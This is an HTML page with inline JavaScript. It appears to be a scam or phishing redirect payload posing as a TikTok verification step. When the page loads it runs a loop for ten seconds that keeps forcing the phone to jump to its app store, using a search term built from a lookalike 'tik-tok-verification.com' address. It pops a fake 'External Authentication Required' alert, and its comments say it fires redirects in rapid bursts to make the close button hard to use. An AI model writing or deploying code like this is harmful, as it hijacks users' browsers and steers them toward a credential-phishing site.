<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 10000; 
    const gap = 320; 

    function triggerStoreJump() {
        const urlEnc = encodeURIComponent(target);
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        // This is the specific protocol that you confirmed works consistently
        const iosTrigger = "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
        const androidTrigger = "market://search?q=" + urlEnc;
        
        window.location.href = isAndroid ? androidTrigger : iosTrigger;
    }

    function rampage() {
        if (Date.now() > killTime) return;

        // 1. Initial jump
        triggerStoreJump();

        // 2. BACK TO ALERT (The standard lock)
        alert("ATTEMPT #37\n\nExternal Authentication Required.\n\nTap OK to force handover.");

        // 3. THE TRIPLE PULSE (Saturating the 320ms window)
        // This makes it significantly harder to spam the 'X' button 
        // because the OS is constantly receiving 'leave app' requests.
        
        // Pulse 1: Immediate
        triggerStoreJump();

        // Pulse 2: 100ms in
        setTimeout(() => { if (document.hasFocus()) triggerStoreJump(); }, 100);

        // Pulse 3: 200ms in
        setTimeout(() => { if (document.hasFocus()) triggerStoreJump(); }, 200);

        // 4. Restart the loop at 320ms
        setTimeout(() => {
            if (document.hasFocus()) {
                rampage();
            }
        }, gap);
    }

    window.onload = () => {
        rampage();
    };

    // If focus is lost (even for a split second), spam the redirect
    window.onblur = () => { if (Date.now() < killTime) triggerStoreJump(); };
</script>

</body>
